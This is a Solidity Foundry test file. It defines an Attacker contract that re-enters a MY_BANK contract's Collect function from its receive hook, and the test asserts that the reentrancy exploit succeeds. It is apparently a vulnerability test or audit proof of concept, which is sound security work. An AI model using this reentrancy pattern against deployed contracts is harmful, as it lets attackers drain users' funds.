
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MY_BANK, Log} from "../src/MY_BANK.sol";

contract TestReentrancyMY_BANK is Test {

    MY_BANK public bank;
    Log public log;
    Attacker public _attacker;

    function setUp() public {
        log = new Log();
        bank = new MY_BANK(address(log));
        _attacker = new Attacker(address(bank));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal >= 1 ether && attackVal <= type(uint128).max);
        

        vm.warp(block.timestamp + 100);

        vm.deal(address(bank), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);

        
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MY_BANK public bank;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    bool public reenteredWithOldState;

    constructor(address victimAddress) { 
        bank = MY_BANK(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        reenteredWithOldState = false;
        
        bank.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        initialSnapshot = bank.Acc(address(this)).balance;

        bank.Collect(val);

        exploitSucceeded = reenteredWithOldState;
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            if (bank.Acc(address(this)).balance == initialSnapshot) {
                reenteredWithOldState = true;
            }
            bank.Collect(0);
        }
    }
}
